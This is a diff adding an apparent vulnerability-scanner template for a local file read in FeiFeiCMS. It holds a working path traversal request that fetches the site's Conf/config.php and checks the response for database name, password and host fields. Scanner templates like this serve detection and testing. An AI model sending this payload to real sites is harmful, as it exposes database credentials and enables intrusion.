@@ -1,0 +1,28 @@
+id: feifeicms-lfr
+info:
+  author: princechaddha
+  name: FeiFeiCms Local File Read
+  reference: '- https://www.cnblogs.com/jinqi520/p/10202615.html
+
+    - https://gitee.com/daicuo/feifeicms
+
+    '
+  severity: high
+  tags: feifeicms,lfi
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - <?php
+    - db_name
+    - db_pwd
+    - db_host
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php'
